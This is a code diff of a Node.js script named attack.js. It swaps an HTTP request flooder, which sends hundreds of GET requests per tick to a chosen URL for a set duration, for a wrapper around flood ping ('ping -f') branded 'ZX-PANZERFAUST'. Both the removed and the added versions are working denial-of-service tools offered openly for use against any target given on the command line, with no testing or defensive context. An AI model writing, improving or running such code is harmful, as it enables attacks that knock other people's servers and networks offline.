@@ -1,58 +1,35 @@
-const https = require('https');
-const http = require('http');
-const { URL } = require('url');
+const { spawn } = require('child_process');
+const [target, time] = process.argv.slice(2);
 
-if (process.argv.length < 4) {
-  console.log("Usage: node attack.js <url> <duration_in_seconds>");
-  process.exit(1);
+if (!target || !time) {
+    console.log("Usage: node attack.js <target> <time>");
+    process.exit(1);
 }
 
-const target = process.argv[2];
-const duration = parseInt(process.argv[3]);
-const endTime = Date.now() + duration * 1000;
+const cmd = spawn('ping', ['-f', '-i', '0.1', '-w', time, target]);  // Flood ping
 
-const url = new URL(target);
-const client = url.protocol === 'https:' ? https : http;
+let pings = 0;
 
-function flood() {
-  const options = {
-    hostname: url.hostname,
-    port: url.port || (url.protocol === 'https:' ? 443 : 80),
-    path: url.pathname + url.search,
-    method: 'GET',
-    headers: {
-      'User-Agent': 'LoadTester/1.0',
-      'Accept': '*/*'
-    }
-  };
+const logPings = () => {
+    process.stdout.write(`\rZX-PANZERFAUST pings: ${pings}`);  // Overwrite every 2 seconds
+};
 
-  const req = client.request(options, res => {
-    res.resume(); // Discard response data
-  });
+cmd.stdout.on('data', () => {
+    pings++;
+});
 
-  req.on('error', () => { /* Ignore errors */ });
-  req.end();
-}
+cmd.stderr.on('data', (data) => {
+    console.error(`error: ${data}`);
+});
 
-function startFlood() {
-  const floodInterval = setInterval(() => {
-    if (Date.now() > endTime) {
-      clearInterval(floodInterval);
-      clearInterval(statusLog);
-      console.log("Attack completed.");
-      return;
-    }
+cmd.on('exit', (code) => {
+    console.log(`\nProcess exited with code ${code}`);
+});
 
-    for (let i = 0; i < 100; i++) {
-      flood();
-    }
-  }, 10);
+process.on('SIGINT', () => {
+    cmd.kill();
+    console.log(`\n--- ZX-PANZERFAUST OFF ---\npings: ${pings}`);
+});
 
-  const statusLog = setInterval(() => {
-    const timeLeft = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
-    console.log(`[INFO] ATTACK RUNNING - ${timeLeft}s remaining`);
-  }, 2000);
-}
-
-console.log(`Starting attack on ${target} for ${duration} seconds...`);
-startFlood();
+// Log every 2 seconds
+setInterval(logPings, 2000);
